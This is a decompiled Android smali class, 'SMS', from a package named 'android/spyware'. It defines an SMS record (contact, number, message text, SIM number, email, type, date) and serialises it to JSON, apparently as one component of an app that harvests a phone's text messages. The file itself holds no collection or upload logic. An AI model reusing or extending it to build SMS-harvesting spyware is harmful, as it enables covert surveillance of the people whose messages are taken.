.class public Landroid/spyware/SMS;
.super Ljava/lang/Object;
.source "SMS.java"


# instance fields
.field private contactName:Ljava/lang/String;

.field private contactNo:Ljava/lang/String;

.field private date:Ljava/util/Date;

.field private email:Ljava/lang/String;

.field private idS:J

.field private message:Ljava/lang/String;

.field private simNo:Ljava/lang/String;

.field private thread:J

.field private type:Ljava/lang/String;


# direct methods
.method public constructor <init>(JLjava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/util/Date;)V
    .registers 13
    .param p1, "idS"    # J
    .param p3, "email"    # Ljava/lang/String;
    .param p4, "simNo"    # Ljava/lang/String;
    .param p5, "thread"    # J
    .param p7, "contactNo"    # Ljava/lang/String;
    .param p8, "contactName"    # Ljava/lang/String;
    .param p9, "message"    # Ljava/lang/String;
    .param p10, "type"    # I
    .param p11, "date"    # Ljava/util/Date;

    .prologue
    .line 30
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 31
    iput-wide p1, p0, Landroid/spyware/SMS;->idS:J

    .line 32
    iput-object p3, p0, Landroid/spyware/SMS;->email:Ljava/lang/String;

    .line 33
    iput-object p4, p0, Landroid/spyware/SMS;->simNo:Ljava/lang/String;

    .line 34
    iput-wide p5, p0, Landroid/spyware/SMS;->thread:J

    .line 35
    iput-object p7, p0, Landroid/spyware/SMS;->contactNo:Ljava/lang/String;

    .line 36
    iput-object p8, p0, Landroid/spyware/SMS;->contactName:Ljava/lang/String;

    .line 37
    iput-object p9, p0, Landroid/spyware/SMS;->message:Ljava/lang/String;

    .line 39
    packed-switch p10, :pswitch_data_3e

    .line 62
    const-string v0, "N/A"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    .line 66
    :goto_18
    iput-object p11, p0, Landroid/spyware/SMS;->date:Ljava/util/Date;

    .line 67
    return-void

    .line 41
    :pswitch_1b
    const-string v0, "ALL"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 44
    :pswitch_20
    const-string v0, "INBOX"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 47
    :pswitch_25
    const-string v0, "SENT"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 50
    :pswitch_2a
    const-string v0, "DRAFT"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 53
    :pswitch_2f
    const-string v0, "OUTBOX"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 56
    :pswitch_34
    const-string v0, "FAILED"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 59
    :pswitch_39
    const-string v0, "QUEUED"

    iput-object v0, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    goto :goto_18

    .line 39
    :pswitch_data_3e
    .packed-switch 0x0
        :pswitch_1b
        :pswitch_20
        :pswitch_25
        :pswitch_2a
        :pswitch_2f
        :pswitch_34
        :pswitch_39
    .end packed-switch
.end method


# virtual methods
.method public getDate()Ljava/util/Date;
    .registers 2

    .prologue
    .line 70
    iget-object v0, p0, Landroid/spyware/SMS;->date:Ljava/util/Date;

    return-object v0
.end method

.method public toJSON()Lorg/json/JSONObject;
    .registers 7

    .prologue
    .line 74
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 77
    .local v2, "jSMS":Lorg/json/JSONObject;
    :try_start_5
    const-string v3, "idS"

    iget-wide v4, p0, Landroid/spyware/SMS;->idS:J

    invoke-virtual {v2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 78
    const-string v3, "simNo"

    iget-object v4, p0, Landroid/spyware/SMS;->simNo:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 79
    const-string v3, "email"

    iget-object v4, p0, Landroid/spyware/SMS;->email:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 80
    const-string v3, "thread"

    iget-wide v4, p0, Landroid/spyware/SMS;->thread:J

    invoke-virtual {v2, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 81
    const-string v3, "contactNo"

    iget-object v4, p0, Landroid/spyware/SMS;->contactNo:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 82
    const-string v3, "contactName"

    iget-object v4, p0, Landroid/spyware/SMS;->contactName:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 83
    const-string v3, "message"

    iget-object v4, p0, Landroid/spyware/SMS;->message:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 84
    const-string v3, "type"

    iget-object v4, p0, Landroid/spyware/SMS;->type:Ljava/lang/String;

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 87
    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v3, "yyyy-MM-dd HH:mm:ss"

    sget-object v4, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v1, v3, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 88
    .local v1, "formatter":Ljava/text/SimpleDateFormat;
    const-string v3, "date"

    iget-object v4, p0, Landroid/spyware/SMS;->date:Ljava/util/Date;

    invoke-virtual {v1, v4}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_51
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_51} :catch_52

    .line 95
    .end local v1    # "formatter":Ljava/text/SimpleDateFormat;
    .end local v2    # "jSMS":Lorg/json/JSONObject;
    :goto_51
    return-object v2

    .line 89
    .restart local v2    # "jSMS":Lorg/json/JSONObject;
    :catch_52
    move-exception v0

    .line 91
    .local v0, "e":Lorg/json/JSONException;
    const-string v3, "::trace"

    invoke-static {v0}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 92
    const/4 v2, 0x0

    goto :goto_51
.end method
